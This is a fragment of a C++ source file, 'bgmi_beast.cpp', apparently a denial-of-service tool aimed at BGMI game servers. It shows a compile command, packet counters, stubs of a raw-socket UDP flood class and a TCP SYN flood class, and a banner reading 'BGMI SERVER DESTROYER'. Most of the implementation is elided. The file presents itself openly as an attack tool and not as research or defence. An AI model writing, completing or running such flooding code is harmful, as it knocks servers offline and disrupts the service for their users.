// bgmi_beast.cpp
// Compile: g++ -O3 -pthread -o bgmi_beast bgmi_beast.cpp
...
#define STATS_INTERVAL_MS 2000  // print stats every 2 seconds

std::atomic<bool> running(true);
std::atomic<long long> total_packets(0);

// ============================================================
// UDP FLOOD ENGINE (RAW SOCKET - FASTEST)
// ============================================================
class UDPFlooder {
private:
    int sock;
...
// ============================================================
// TCP SYN FLOOD (CONNECT STYLE - FOR GAME SERVERS)
// ============================================================
class TCPFlooder {
private:
...
int main(int argc, char* argv[]) {
    std::cout << "🔥🔥🔥 BGMI SERVER DESTROYER 🔥🔥🔥\n";
    std::cout << "=====================================\n";
